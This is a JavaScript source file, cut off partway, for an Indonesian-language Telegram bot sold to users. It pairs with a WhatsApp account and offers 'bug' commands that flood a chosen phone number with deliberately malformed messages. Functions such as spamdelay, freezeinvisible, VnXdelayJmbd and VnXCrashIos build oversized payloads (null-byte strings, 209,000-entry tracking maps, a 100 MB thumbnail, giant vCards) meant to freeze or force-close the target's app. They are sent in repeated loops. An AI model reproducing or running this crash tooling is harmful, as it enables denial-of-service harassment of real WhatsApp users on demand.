const { Telegraf, session } = require("telegraf");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
    makeWASocket,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");

// ======================= KONFIGURASI =======================
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");

const sessionPath = "./session";
const premiumFile = "./Stored/premiums.json";
const adminFile = "./Stored/admins.json";
const ownerFile = "./Stored/owners.json";
const cooldownFile = "./Stored/cooldown.json";

// ======================= VARIABEL GLOBAL =======================
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let reconnectAttempts = 0;
const maxReconnect = 10;
let currentVersion = "2.0.0";
let pendingUpdate = false;
let cooldownSettings = {};

// Cache Token GitHub
let cachedValidTokens = [];
let lastTokenFetch = 0;
const TOKEN_CACHE_TTL = 30000;

const bot = new Telegraf(BOT_TOKEN);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ======================= PASTIKAN FOLDER STORED ADA =======================
if (!fs.existsSync("./Stored")) {
    fs.mkdirSync("./Stored", { recursive: true });
}

// ======================= FUNGSI LOAD & SAVE JSON =======================
const loadJSON = (filePath) => {
    try {
        if (!fs.existsSync(filePath)) return [];
        const data = fs.readFileSync(filePath, "utf8");
        return data ? JSON.parse(data) : [];
    } catch (err) {
        console.error(chalk.red(`Gagal memuat ${filePath}:`), err.message);
        return [];
    }
};

const loadObjectJSON = (filePath) => {
    try {
        if (!fs.existsSync(filePath)) return {};
        const data = fs.readFileSync(filePath, "utf8");
        return data ? JSON.parse(data) : {};
    } catch (err) {
        console.error(chalk.red(`Gagal memuat ${filePath}:`), err.message);
        return {};
    }
};

const saveJSON = (filePath, data) => {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error(chalk.red(`Gagal menyimpan ${filePath}:`), err.message);
    }
};

let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);
let ownerUsers = loadJSON(ownerFile);
cooldownSettings = loadObjectJSON(cooldownFile);

// ======================= FUNGSI COOLDOWN =======================
const setCooldown = (command, duration) => {
    cooldownSettings[command] = duration;
    saveJSON(cooldownFile, cooldownSettings);
};

const getCooldown = (command) => {
    return cooldownSettings[command] || null;
};

const checkCooldown = (ctx, command) => {
    const cooldown = getCooldown(command);
    if (!cooldown) return true;
    
    const lastUsed = ctx.session?.lastCommand?.[command] || 0;
    const now = Date.now();
    const diff = (now - lastUsed) / 1000;
    
    if (diff < cooldown) {
        ctx.reply(`Tunggu ${Math.ceil(cooldown - diff)} detik sebelum menggunakan /${command} lagi.`);
        return false;
    }
    
    if (!ctx.session.lastCommand) ctx.session.lastCommand = {};
    ctx.session.lastCommand[command] = now;
    return true;
};

// ======================= FUNGSI TOKEN GITHUB =======================
async function fetchValidTokens(forceRefresh = false) {
    const now = Date.now();
    if (!forceRefresh && (now - lastTokenFetch) < TOKEN_CACHE_TTL && cachedValidTokens.length > 0) {
        return cachedValidTokens;
    }

    try {
        console.log(chalk.yellow("Mengambil token dari GitHub..."));
        const GITHUB_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/database-/main/database.json";
        const { data } = await axios.get(GITHUB_URL, {
            timeout: 10000,
            headers: { "Cache-Control": "no-cache" }
        });
        cachedValidTokens = Array.isArray(data.tokens) ? data.tokens : [];
        lastTokenFetch = now;
        console.log(chalk.green(`${cachedValidTokens.length} token ditemukan`));
        return cachedValidTokens;
    } catch (err) {
        console.log(chalk.red("Gagal ambil token:", err.message));
        return cachedValidTokens.length ? cachedValidTokens : [];
    }
}

// ======================= VALIDASI TOKEN AWAL =======================
async function validateTokenOnStart() {
    console.log(chalk.blue("Verifikasi token ke GitHub..."));
    const validTokens = await fetchValidTokens(true);

    if (!validTokens.length) {
        console.log(chalk.red(`
╔══════════════════════════════════════╗
║  TIDAK ADA TOKEN DI DATABASE         ║
║  Tambahkan token via Web             ║
╚══════════════════════════════════════╝
        `));
        process.exit(1);
    }

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red(`
╔══════════════════════════════════════╗
║  TOKEN TELEGRAM TIDAK VALID          ║
║  Hubungi owner untuk menambahkan     ║
╚══════════════════════════════════════╝
        `));
        process.exit(1);
    }

    console.log(chalk.green("Token valid! Bot akan berjalan..."));
    return true;
}

// ======================= AUTO REFRESH TOKEN =======================
function startAutoTokenRefresh() {
    setInterval(async () => {
        const newTokens = await fetchValidTokens(true);
        if (!newTokens.includes(BOT_TOKEN)) {
            console.log(chalk.red("Token Anda telah dihapus dari GitHub! Bot akan mati..."));
            setTimeout(() => process.exit(1), 5000);
        }
    }, 60000);
}

// ======================= SESSION & WHATSAPP =======================
function deleteSession() {
    try {
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
            console.log(chalk.yellow("Session dihapus"));
            return true;
        }
    } catch (err) {
        console.log(chalk.red("Gagal hapus session:", err.message));
    }
    return false;
}

const startSesi = async () => {
    if (isStarting) return;
    isStarting = true;

    console.log(chalk.blue("╔════════════════════════════╗"));
    console.log(chalk.blue("║   Memulai Sesi WhatsApp    ║"));
    console.log(chalk.blue("╚════════════════════════════╝"));

    if (sock?.ev) {
        sock.ev.removeAllListeners("connection.update");
        sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        browser: ["Linux", "Chrome", "20.0.04"],
        keepAliveIntervalMs: 30000,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        const reason = lastDisconnect?.error?.output?.statusCode;

        if (connection === "open") {
            isWhatsAppConnected = true;
            isStarting = false;
            reconnectAttempts = 0;
            linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

            console.log(chalk.green(`╔════════════════════════════╗`));
            console.log(chalk.green(`║   WhatsApp Terhubung       ║`));
            console.log(chalk.green(`║   ${linkedWhatsAppNumber}   ║`));
            console.log(chalk.green(`╚════════════════════════════╝`));

            if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
                try {
                    await bot.telegram.editMessageCaption(
                        global.pairingMessage.chatId,
                        global.pairingMessage.messageId,
                        undefined,
                        `<b>WhatsApp Terhubung</b>\nNomor: ${linkedWhatsAppNumber}`,
                        { parse_mode: "HTML" }
                    );
                } catch (e) {}
                global.pairingMessage = null;
            }
        }

        if (connection === "close") {
            isWhatsAppConnected = false;
            isStarting = false;

            if (reason === DisconnectReason.loggedOut || reason === 401) {
                deleteSession();
                reconnectAttempts = 0;
                return;
            }

            reconnectAttempts++;
            if (reconnectAttempts > maxReconnect) return;

            const delay = Math.min(5000 * reconnectAttempts, 30000);
            console.log(chalk.yellow(`Reconnect dalam ${delay / 1000}s`));
            setTimeout(() => startSesi(), delay);
        }
    });
};

// ======================= MIDDLEWARE =======================
const checkOwner = (ctx, next) => {
    if (!OWNER_IDS.includes(ctx.from.id.toString())) {
        return ctx.reply("Fitur Ini Khusus Owner");
    }
    return next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("Fitur Ini Khusus Admin.");
    }
    return next();
};

const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("Fitur Ini Khusus Premium.");
    }
    return next();
};

const checkWA = (ctx, next) => {
    if (!isWhatsAppConnected) {
        return ctx.reply("WhatsApp Belum terhubung\nGunakan /addbot untuk pairing terlebih dahulu");
    }
    return next();
};

// ======================= FUNGSI ADMIN/PREMIUM/OWNER =======================
const addOwner = (id) => { if (!ownerUsers.includes(id)) { ownerUsers.push(id); saveJSON(ownerFile, ownerUsers); } };
const removeOwner = (id) => { ownerUsers = ownerUsers.filter(i => i !== id); saveJSON(ownerFile, ownerUsers); };
const addAdmin = (id) => { if (!adminUsers.includes(id)) { adminUsers.push(id); saveJSON(adminFile, adminUsers); } };
const removeAdmin = (id) => { adminUsers = adminUsers.filter(i => i !== id); saveJSON(adminFile, adminUsers); };
const addPremium = (id) => { if (!premiumUsers.includes(id)) { premiumUsers.push(id); saveJSON(premiumFile, premiumUsers); } };
const removePremium = (id) => { premiumUsers = premiumUsers.filter(i => i !== id); saveJSON(premiumFile, premiumUsers); };

// ======================= FUNGSI BUG =======================
async function spamdelay(sock, target) {
    for (let i = 0; i < 999; i++) {
        const x = "\u0000".repeat(9000);
        const ryy = "999999999999";
        const startTime = Date.now();
        const duration = 1 * 60 * 1000;
        while (Date.now() - startTime < duration) {
            const xryy = {
                groupStatusMessageV2: {
                    message: {
                        stickerPackMessage: {
                            stickerPackId: x,
                            name: x,
                            publisher: x,
                            fileLength: ryy,
                            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                            mimetype: "image/webp",
                            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                            contextInfo: {
                                remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
                                isForwarded: true,
                                forwardingScore: 9999,
                                urlTrackingMap: {
                                    urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                                        participant: `62${z + 899099}@s.whatsapp.net`
                                    }))
                                }
                            }
                        }
                    }
                }
            };
            
            const xryyv2 = {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "XRyyModeLawkaNnjr",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "1",
                                version: 3
                            },
                            contextInfo: {
                                remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
                                isForwarded: true,
                                forwardingScore: 9999,
                                urlTrackingMap: {
                                    urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                                        participant: `62${z + 720599}@s.whatsapp.net`
                                    }))
                                }
                            }
                        }
                    }
                }
            };
            
            await sleep(3000);
            await sock.relayMessage(target, xryy, { participant: { jid: target } });
            await sock.relayMessage(target, xryyv2, { participant: { jid: target } });
        }
    }
}

async function freezeinvisible(sock, target) {
    const msg = {
        message: {
            groupStatusMessageV2: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 999999999999999,
                        degreesLongitude: 999999999999999,
                        name: "ោ៝".repeat(40000),
                        address: "ោ៝".repeat(945900),
                        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
                        jpegThumbnail: Buffer.alloc(104857600, 0xFF),
                        contextInfo: {
                            mentionedJid: [target],
                            stanzaId: "maklo",
                            participant: target,
                            urlTrackingMap: {
                                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                                    participant: `62${z + 720599}@s.whatsapp.net`
                                }))
                            }
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage("status@broadcast", msg, {
        messageId: null,
        participant: { jid: target },
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });
}

async function VnXdelayJmbd(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                        mimetype: "image/webp",
                        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                        fileLength: 10610,
                        mediaKeyTimestamp: 1775044724,
                        stickerSentTs: 1775044724091,
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 9999999,
                            pairedMediaType: 1,
                            statusSourceType: 1,
                            statusAttributionType: 2,
                            urlTrackingMap: {
                                urlTrackingMapElements: Array.from({ length: 250000 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        await sock.relayMessage(target, msg, { participant: { jid: target } });
        console.log("Target Is dead");
        await new Promise(r => setTimeout(r, 1500));
    } catch (err) {
        console.error("Error:", err);
        await new Promise(r => setTimeout(r, 5000));
    }
}

async function VnXCrashIos(sock, target) {
    let mbgiosvnx = await generateWAMessageFromContent(
        target,
        {
            contactMessage: {
                displayName: "°‌‌VnXIos ⿻ VnX ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(25000),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                contextInfo: {
                    stanzaId: "VnX",
                    mentionedJid: [target],
                    isForwarded: true,
                    forwardingScore: 999,
                    interactiveAnnotations: [{
                        polygonVertices: [
                            { x: 0.05625700578093529, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.8459166884422302 },
                            { x: 0.05625700578093529, y: 0.8459166884422302 }
                        ],
                        newsletter: {
                            newsletterJid: "120363186130999681@newsletter",
                            serverMessageId: 3033,
                            newsletterName: "sex null",
                            contentType: "UPDATE_CARD"
                        }
                    }]
                }
            }
        },
        { userJid: sock.user.id, quoted: null }
    );
    await sock.relayMessage(
        "status@broadcast",
        mbgiosvnx.message,
        {
            messageId: mbgiosvnx.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function hapusBug(sock, target) {
    for (let i = 0; i < 3; i++) {
        await sock.sendMessage(target, { 
            text: "CIKIDAW CLEAR BUG\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSENZY GANTENG"
        });
    }
}

// ======================= COMMAND TELEGRAM =======================
bot.use(session());

const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${hours}h ${minutes}m ${seconds}s`;
};

const randomImages = [
    "https://files.catbox.moe/eozi3e.jpg",
    "https://files.catbox.moe/eozi3e.jpg",
];
const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Halaman 0 - MENU UTAMA
const mainMenuMessage = (Name, waktuRunPanel) => `\`\`\`Js
𖥂 Linux Sciento 𖥂
Powerful • Secure • Exclusive

Owners : @ItsImLxanderX5
My Best Friend : @penzoyzy29

Harga Users : Rp25.000
Harga Reseller : Rp30.000

Klik button di bawah untuk melanjutkan
\`\`\``;

// Halaman 1 - OWNER MENU
const ownerMenuMessage = `\`\`\`Js
⬡═—⊱ AKSES OWNER ⊰—═⬡
• /addowner → TAMBAH OWNER
• /delowner → HAPUS OWNER
• /addadmin → TAMBAH ADMIN
• /deladmin → HAPUS ADMIN
• /addprem → TAMBAH PREMIUM
• /delprem → HAPUS PREMIUM
• /setcd → SETTING COOLDOWN
• /addbot → TAMBAH SENDER
• /delbot → HAPUS SENDER
• /listbot → CEK SENDER AKTIF
• /pullupdate → UPDATE SCRIPT

⬡═—⊱ AKSES ADMIN ⊰—═⬡
• /addprem → TAMBAH PREMIUM
• /delprem → HAPUS PREMIUM
• /setcd → SETTING COOLDOWN
• /addbot → TAMBAH SENDER
• /delbot → HAPUS SENDER
• /listbot → CEK SENDER AKTIF
\`\`\``;

// Halaman 2 - BUG MENU
const bugMenuMessage = `\`\`\`Js
⬡═—⊱ BUG MENU ⊰—═⬡
• /Apidelay → DELAY INVISIBLE
• /XDelayHard → DELAY HARD INVISIBLE
• /delayXfreeze → FREEZE INVISIBLE
• /XvIos → FORCE CLOSE IOS
• /hapusbug → HAPUS BUG YANG DIKIRIM
\`\`\``;

// Halaman 3 - SUPPORT MENU
const supportMenuMessage = `\`\`\`Js
╭━━━〔 LINUX SCIENTO BEST SUPPORT 〕━━━╮

┌─〔 CORE SUPPORT 〕
│ ✦ @Allah        ➤ Endless Blessing
│ ✦ @Ortu         ➤ Real Life Backbone
└────────────────────

┌─〔 LINUX SCIENTO TEAM 〕
│ ✦ @penzoyzy29
│ ✦ @ItsImLxanderX5
│ ✦ @arshadeva
│ ✦ All buyer and member Linux Sciento
└────────────────────

┌─〔 SPECIAL THANKS 〕
│ ✦ Semua Member Linux Sciento
│ ✦ Semua Yang Pernah Support
└────────────────────

╰━━━〔 LINUX NEVER DIE 〕━━━╯

Security Script : ACTIVE
King : @ItsImLxanderX5
Friend: @penzoyzy29
\`\`\``;

// Keyboard untuk setiap halaman
const getKeyboard = (currentPage, totalPages) => {
    const keyboard = [
        [
            { text: "◀ Back", callback_data: "nav_prev", disabled: currentPage === 0, style: "danger" },
            { text: `${currentPage + 1}/${totalPages}`, callback_data: "nav_page", style: "primary" },
            { text: "Next ▶", callback_data: "nav_next", disabled: currentPage === totalPages - 1, style: "success" }
        ],
        [
            { text: "Owner", url: "https://t.me/ItsImLxanderX5", style: "primary" }
        ]
    ];
    
    return {
        inline_keyboard: keyboard.map(row =>
            row.map(btn => {
                if (btn.url) {
                    return { text: btn.text, url: btn.url };
                } else {
                    const button = { text: btn.text, callback_data: btn.callback_data };
                    if (btn.style === "danger") return { ...button, style: "danger" };
                    if (btn.style === "primary") return { ...button, style: "primary" };
                    if (btn.style === "success") return { ...button, style: "success" };
                    return button;
                }
            })
        )
    };
};

// Handler navigasi
bot.action(/nav_(prev|next|page)/, async (ctx) => {
    const action = ctx.match[1];
    const currentPage = ctx.session?.currentPage || 0;
    let newPage = currentPage;
    
    const totalPages = 4;

    if (action === 'prev' && currentPage > 0) {
        newPage = currentPage - 1;
    } else if (action === 'next' && currentPage < totalPages - 1) {
        newPage = currentPage + 1;
    } else if (action === 'page') {
        return ctx.answerCbQuery(`Halaman ${currentPage + 1} dari ${totalPages}`);
    }

    if (newPage !== currentPage) {
        ctx.session.currentPage = newPage;
        const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
        const waktuRunPanel = getUptime();
        
        let caption = "";
        if (newPage === 0) caption = mainMenuMessage(Name, waktuRunPanel);
        else if (newPage === 1) caption = ownerMenuMessage;
        else if (newPage === 2) caption = bugMenuMessage;
        else caption = supportMenuMessage;

        const media = {
            type: "photo",
            media: getRandomImage(),
            caption: caption,
            parse_mode: "Markdown"
        };

        try {
            await ctx.editMessageMedia(media, { reply_markup: getKeyboard(newPage, totalPages) });
        } catch (err) {
            await ctx.replyWithPhoto(media.media, {
                caption: media.caption,
                parse_mode: media.parse_mode,
                reply_markup: getKeyboard(newPage, totalPages)
            });
        }
    }
    await ctx.answerCbQuery();
});

// Command /start
bot.start(async (ctx) => {
    const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
    const waktuRunPanel = getUptime();
    
    ctx.session = ctx.session || {};
    ctx.session.currentPage = 0;

    await ctx.replyWithPhoto(getRandomImage(), {
        caption: mainMenuMessage(Name, waktuRunPanel),
        parse_mode: "Markdown",
        reply_markup: getKeyboard(0, 4)
    });
});

// ======================= COMMAND BUG =======================
bot.command("Apidelay", checkWA, checkPremium, async (ctx) => {
    if (!checkCooldown(ctx, "Apidelay")) return;
    
    let target = ctx.message.text.split(" ")[1];
    if (!target) return ctx.reply(`Example: /Apidelay 62xxxx`);
    target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
        caption: `\`\`\`Js
☇ Target: ${target}
☇ Status: Succes
☇ Type: /Apidelay 
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
        },
    });

    (async () => {
        for (let i = 0; i < 10; i++) {
            console.log(chalk.red(`Send Bug Apidelay ${i + 1} To ${target}`));
            await VnXdelayJmbd(sock, target);
            await sleep(1);
        }
    })();
});

bot.command("XDelayHard", checkWA, checkPremium, async (ctx) => {
    if (!checkCooldown(ctx, "XDelayHard")) return;
    
    let target = ctx.message.text.split(" ")[1];
    if (!target) return ctx.reply(`Example: /XDelayHard 62xxxx`);
    target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
        caption: `\`\`\`Js
☇ Target: ${target}
☇ Status: Succes
☇ Type: /XDelayHard 
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
        },
    });

    (async () => {
        for (let i = 0; i < 4; i++) {
            console.log(chalk.red(`Send Bug XDelayHard ${i + 1} To ${target}`));
            await spamdelay(sock, target);
        }
    })();
});

bot.command("delayXfreeze", checkWA, checkPremium, async (ctx) => {
    if (!checkCooldown(ctx, "delayXfreeze")) return;
    
    let target = ctx.message.text.split(" ")[1];
    if (!target) return ctx.reply(`Example: /delayXfreeze 62xxxx`);
    target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
        caption: `\`\`\`Js
☇ Target: ${target}
☇ Status: Succes
☇ Type: /delayXfreeze 
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
        },
    });

    (async () => {
        for (let i = 0; i < 20; i++) {
            console.log(chalk.red(`Send Bug delayXfreeze ${i + 1}/500 To ${target}`));
            await freezeinvisible(sock, target);
            await sleep(10);
        }
    })();
});

bot.command("XvIos", checkWA, checkPremium, async (ctx) => {
    if (!checkCooldown(ctx, "XvIos")) return;
    
    let target = ctx.message.text.split(" ")[1];
    if (!target) return ctx.reply(`Example: /XvIos 62xxxx`);
    target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
        caption: `\`\`\`Js
☇ Target: ${target}
☇ Status: Succes
☇ Type: /XvIos 
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
        },
    });

    (async () => {
        for (let i = 0; i < 400; i++) {
            console.log(chalk.red(`Send Bug XvIos ${i + 1} To ${target}`));
            await VnXCrashIos(sock, target);
            await sleep(2000);
        }
    })();
});

bot.command("hapusbug", checkWA, checkPremium, async (ctx) => {
    if (!checkCooldown(ctx, "hapusbug")) return;
    
    let target = ctx.message.text.split(" ")[1];
    if (!target) return ctx.reply(`Example: /hapusbug 62xxxx`);
    target = target.replace(/[^0-9]/g, "");
    
    if (target.startsWith('0')) {
        return ctx.reply(`Contoh : /hapusbug 628xxxx`);
    }
    
    let jid = target + '@s.whatsapp.net';
    
    await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
        caption: `\`\`\`Js
☇ Target: ${target}
☇ Status: Succes
☇ Type: /hapusbug
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target}` }]],
        },
    });

    (async () => {
        try {
            for (let i = 0; i < 3; i++) {
                console.log(chalk.red(`Send Clear Bug ${i + 1} To ${target}`));
                await hapusBug(sock, jid);
                await sleep(1000);
            }
            await ctx.reply("Done Clear Bug By Linux Sciento");
        } catch (err) {
            console.error("Error:", err);
            await ctx.reply("Ada kesalahan saat mengirim bug.");
        }
    })();
});

// ======================= COMMAND ADMIN & OWNER =======================
bot.command("addowner", checkOwner, (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Format Salah!. Example: /addowner 12345678");
    const userId = args[1];
    if (ownerUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} sudah memiliki status owner.`);
    addOwner(userId);
    return ctx.reply(`Pengguna ${userId} sekarang memiliki akses owner!`);
});

bot.command("delowner", checkOwner, (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Format Salah!. Example: /delowner 12345678");
    const userId = args[1];
    if (!ownerUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} tidak ada dalam daftar Owner.`);
    removeOwner(userId);
    return ctx.reply(`Pengguna ${userId} telah dihapus dari daftar Owner.`);
});

bot.command("addadmin", checkOwner, (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Format Salah!. Example: /addadmin 12345678");
    const userId = args[1];
    if (adminUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} sudah memiliki status admin.`);
    addAdmin(userId);
    return ctx.reply(`Pengguna ${userId} sekarang memiliki akses admin!`);
});

bot.command("deladmin", checkOwner, (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Format Salah!. Example: /deladmin 12345678");
    const userId = args[1];
